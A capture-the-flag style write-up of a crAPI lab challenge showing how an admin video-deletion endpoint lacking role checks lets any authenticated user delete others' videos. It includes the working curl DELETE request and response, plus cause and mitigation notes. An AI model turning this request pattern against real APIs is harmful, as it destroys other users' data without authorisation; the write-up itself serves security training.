# Challenge 7 — Broken Function Level Authorization: Delete another user's video

**OWASP API Top 10 mapping:** API5:2023 Broken Function Level Authorization  
**crAPI category:** BFLA

## Goal

Delete a video that belongs to another user by abusing an admin-like endpoint that does not actually enforce the admin role.

## Vulnerability

crAPI exposes `DELETE /identity/api/v2/admin/videos/{video_id}`. The path suggests an admin-only operation, but the backing service method only checks that the video exists — it never verifies that the caller has the `ROLE_ADMIN` role. Any authenticated user can therefore delete any video by ID.

## Exploit steps

### 1. Authenticate as a normal user

Use a standard user account such as `test@example.com`.

```bash
JWT="<your-jwt>"
```

### 2. Call the admin video deletion endpoint

Pick a video ID that belongs to another user. In the seeded database, videos are auto-incremented; IDs before the current user's video belong to seeded accounts.

```bash
curl -s -X DELETE \
  -H "Authorization: Bearer $JWT" \
  http://127.0.0.1:8888/identity/api/v2/admin/videos/1 \
  -w "\nHTTP %{http_code}\n"
```

### 3. Observe the response

```json
{
  "message": "User video deleted successfully.",
  "status": 200
}
```

The request succeeded even though the caller is a `ROLE_USER`, not an administrator.

## Why this works

- The controller maps the endpoint under `/api/v2/admin/videos/{video_id}`, giving a false sense of authorization.
- `ProfileServiceImpl.deleteAdminProfileVideo` loads the video by ID and deletes it without checking the caller's role or ownership.
- The JWT filter validates the token but does not enforce admin-only access for this route.

## Impact

- Any user can destroy another user's uploaded videos.
- Privileged admin endpoints become public mutation endpoints.
- The same pattern can lead to broader account or resource tampering.

## Mitigation

- Enforce role-based access control (RBAC) on every privileged route, not just URL naming conventions.
- Use a centralized authorization check (e.g., `@PreAuthorize("hasRole('ADMIN')")`) instead of relying on path prefixes.
- Validate resource ownership **and** required role for destructive operations.
- Regularly audit admin endpoints and include them in automated authorization tests.
